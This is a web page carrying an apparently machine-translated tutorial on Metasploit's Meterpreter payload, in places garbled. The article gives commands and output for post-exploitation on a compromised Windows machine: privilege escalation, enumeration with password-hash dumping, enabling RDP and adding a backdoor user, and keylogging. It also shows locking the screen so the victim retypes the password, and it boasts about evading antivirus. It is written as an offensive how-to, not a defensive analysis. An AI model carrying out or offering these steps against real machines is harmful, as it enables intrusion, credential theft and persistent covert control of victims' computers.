<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Secrets of Meterpreter Payload</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="What is a meterpreter? 
 Meterpreter - advanced multi-functional filling (Payload), which can be dynamically expanded at run time. Under normal condit...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Secrets of Meterpreter Payload</h1><div class="post__text post__text-html js-mediator-article"><h5>  What is a meterpreter? </h5><br>  Meterpreter - advanced multi-functional filling (Payload), which can be dynamically expanded at run time.  Under normal conditions, this means that it provides you with a basic shell and allows you to add new features to it as needed. <br><br>  The first, most frequent action is the introduction of the explorer into the process.  This feature is provided by the migrate command: <br><br> <code>meterpreter &gt; migrate 1888 #1888 ‚Äî PID ,    - ps <br> [*] Migrating to 1888... <br> [*] Migration completed successfully.</code> <br> <br>  Further, as a rule, elevation of privileges to system ones is performed.  To do this, there is a getsystem command that uses a vulnerability that has been discovered in all versions of Windows since version 3.1: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     <code>meterpreter &gt; getsystem <br> ...got system (via technique 1).</code> <a name="habracut"></a> <br><br><h5>  Collection of information </h5><br>  The next step, after connecting to the machine, is collecting information, meterpreter simplified this procedure, thanks to the winenum script: <br><br> <code>meterpreter &gt; run winenum <br> [*] Running Windows Local Enumerion Meterpreter Script <br> [*] New session on 192.168..:1197... <br> [*] Saving general report to /root/.msf4/logs/scripts/winenum/MICROSOF-30B51A_20111024.0931/MICROSOF-30B51A_20111024.0931.txt <br> [*] Output of each individual command is saved to /root/.msf4/logs/scripts/winenum/MICROSOF-30B51A_20111024.0931 <br> [*] Checking if MICROSOF-30B51A is a Virtual Machine ........ <br> [*] UAC is Disabled <br> [*] Running Command List ... <br> [*] running command net view <br> [*] running command netstat -ns <br> [*] running command net accounts <br> [*] running command netstat -vb <br> [*] running command route print <br> [*] running command netstat -nao <br> [*] running command ipconfig /all <br> [*] running command arp -a <br> [*] running command cmd.exe /c set <br> [*] running command ipconfig /displaydns <br> [*] running command tasklist /svc <br> [*] running command netsh firewall show config <br> [*] running command net group administrators <br> [*] running command net view /domain <br> [*] running command net localgroup administrators <br> [*] running command net localgroup <br> [*] running command net user <br> [*] running command net group <br> [*] running command net session <br> [*] running command net share <br> [*] running command gpresult /SCOPE USER /Z <br> [*] running command gpresult /SCOPE COMPUTER /Z <br> [*] Running WMIC Commands .... <br> [*] running command wmic netlogin get name,lastlogon,badpasswordcount <br> [*] running command wmic nteventlog get path,filename,writeable <br> [*] running command wmic netclient list brief <br> [*] running command wmic share get name,path <br> [*] running command wmic logicaldisk get description,filesystem,name,size <br> [*] running command wmic volume list brief <br> [*] running command wmic netuse get name,username,connectiontype,localname <br> [*] running command wmic service list brief <br> [*] running command wmic group list <br> [*] running command wmic useraccount list <br> [*] running command wmic qfe <br> [*] running command wmic product get name,version <br> [*] running command wmic rdtoggle list <br> [*] running command wmic startup list full <br> [*] Extracting software list from registry <br> [*] Dumping password hashes... <br> [*] Getting Tokens... <br> [*] All tokens have been processed <br> [*] Done!</code> <br> <br>  We get a hash of passwords, system settings, a list of users and much more. <br>  There is another script that collects more extensive information, including a registry dump, but sometimes problems arise with it, so I will not bring it.  This script is called scraper. <br><br><h5>  Remote Desktop </h5><br>  Interesting for us is getting access to a remote desktop.  Let us dwell on this issue in more detail, since we have all the means for this.  The script that performs all connection settings is called getgui.  In order to activate the use of the RDP protocol on the remote machine, the -e parameter is used: <br><br> <code>meterpreter &gt; run getgui -e <br> [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator <br> [*] Carlos Perez carlos_perez@darkoperator.com <br> [*] Enabling Remote Desktop <br> [*] RDP is already enabled <br> [*] Setting Terminal Services service startup mode <br> [*] Terminal Services service is already set to auto <br> [*] Opening port in local firewall if necessary <br> [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20111024.1517.rc <br></code> <br>  Next we need to add a new user: <br><br> <code>meterpreter &gt; run getgui -u NAME -p PASSWORD <br> [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator <br> [*] Carlos Perez carlos_perez@darkoperator.com <br> [*] Setting user account for logon <br> [*] Adding User: NAME with Password: PASSWORD <br> [*] Adding User: NAME to local group '                                      ' <br> [*] Adding User: NAME to local group '              ' <br> [*] You can now login with the created user <br> [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20111024.1642.rc</code> <br> <br>  Where NAME is the username, PASSWORD is the password. <br><br><h5>  Get shell </h5><br>  If you need to get a shell on a remote machine, the shell command of the same name is executed.  Or manually run cmd. <br><br><h5>  Equipment operations </h5><br>  If you need to disable a keyboard or mouse, use the uictl command.  It takes the following parameters: <br><br> <code>uictl [enable/disable] [keyboard/mouse]</code> <br> <br>  Enable - enables;  disable - disables. <br><br> <code>meterpreter &gt; uictl disable mouse #  <br> Disabling mouse... <br> meterpreter &gt; uictl enable mouse #  <br> Enabling mouse... <br> meterpreter &gt; uictl disable keyboard #  <br> Disabling keyboard... <br> meterpreter &gt; uictl enable keyboard #  <br> Enabling keyboard...</code> <br> <br><h5>  Keylogger </h5><br>  Built in keyloger already two.  One is just a set of commands: keyscan_start starts the keylogger;  keyscan_dump - displays the result;  keyscan_stop - stops the keylogger. <br><br>  There is also a script called keylogrecorder.  It is more efficient than keyscan, and moreover, writes the result to the log: <br><br> <code>meterpreter &gt; bgrun keylogrecorder <br> [*] Executed Meterpreter with Job ID 2 <br> meterpreter &gt; [*] Starting the keystroke sniffer... <br> [*] Keystrokes being saved in to /root/.msf4/logs/scripts/keylogrecorder/192.168.._20111024.4455.txt #  <br> [*] Recording <br> <br> meterpreter &gt; bgkill 2 #  <br> [*] Killing background job 2...</code> <br> <br><h5>  Ruby </h5><br>  Meterpreter also provides Ruby scripting.  For example, we can display a message box (MessageBox) or lock a workstation.  To do this, you must first connect the railgun: <br><br> <code>meterpreter &gt; irb <br> &gt; client.core.use(¬´railgun¬ª) <br> =&gt; true</code> <br> <br>  Then, to lock the workstation: <br><br> <code>&gt; client.railgun.user32.LockWorkstation() # <br> =&gt; {¬´GetLastError¬ª =&gt; 0. ¬´return¬ª =&gt; true} #  </code> <br> <br>  This is often used to get a user password in conjunction with a keylogger: <br><br> <code>meterpreter &gt; bgrun keylogrecorder #  <br> [*] Executed Meterpreter with Job ID 2 <br> meterpreter &gt; [*] Starting the keystroke sniffer... <br> [*] Keystrokes being saved in to /root/.msf4/logs/scripts/keylogrecorder/192.168.2.27_20111024.4455.txt #  <br> [*] Recording <br> <br> meterpreter &gt; irb <br> &gt; client.core.use(¬´railgun¬ª) # railgun <br> =&gt; true <br> &gt; client.railgun.user32.LockWorkstation() #   <br> =&gt; {¬´GetLastError¬ª =&gt; 0. ¬´return¬ª =&gt; true}</code> <br> <br>  The user, referring to the buggy Windows will enter the password, and we will see it in the keyloger log. <br><br>  Displaying a dialog with a message is also easy: <br><br> <code>&gt; client.railgun.user32.MessageBoxA(0, ¬´ ¬ª, ¬´¬ª, ¬´MB_OK¬ª)</code> <br> <br>  More information about the output of such messages can read in MSDN. <br><br>  There is another interesting command screenshot.  With it, you can take a screenshot on the remote machine.  If you are working under Linux, the launch of Metasploit should be performed as root, since the screenshot is saved in the msf3 folder. <br><br>  If you need to shut down or restart the machine, there are shutdown and reboot commands of the same name.  If shutdown or reboot did not work, it happens, kill the lsass.exe process, then the system will still restart in a minute: <br><br> <code>meterpreter &gt; kill 866 #866 ‚Äî PID ,  ps,   </code> <br> <br>  Consider another point.  I tested Meterpreter on machines with different antivirus and firewalls, in particular Outpost, Dr.  Web and KIS.  A full check was carried out, the enhanced security modes were activated, but despite this the meterpreter remained unnoticed. <br><br><h5>  Conclusion <br></h5><br>  Meterpreter is a great tool for remote control, which in addition to the large number of built-in tools has the ability to expand functionality.  At the same time, it is completely invisible for most antiviruses (I did not check everything, I don‚Äôt know).  There are, of course, separate tools for its detection, for example, Symantec has released it and can download it, but most ordinary users are not aware of what meterpreter is and what it threatens, therefore, IMHO, they will not download a separate product for its detection. </div><p>Source: <a href="https://habr.com/ru/post/131112/">https://habr.com/ru/post/131112/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../131105/index.html">Cxxtools template library</a></li>
<li><a href="../131107/index.html">Crossposting in twitter, facebook, livejournal, vkontakte</a></li>
<li><a href="../131109/index.html">38 billion rubles for copyright infringement</a></li>
<li><a href="../131110/index.html">Test can not be pardoned</a></li>
<li><a href="../131111/index.html">MySQL replication one-slave-multi-master</a></li>
<li><a href="../131113/index.html">Configuring cisco aaa + tac_plus (tacacs +)</a></li>
<li><a href="../131115/index.html">The role of business processes in interface design</a></li>
<li><a href="../131116/index.html">Automating Internet Radio on Linux</a></li>
<li><a href="../131117/index.html">Memory Minesweeper</a></li>
<li><a href="../131118/index.html">Repair "flooded" laptop keyboard</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>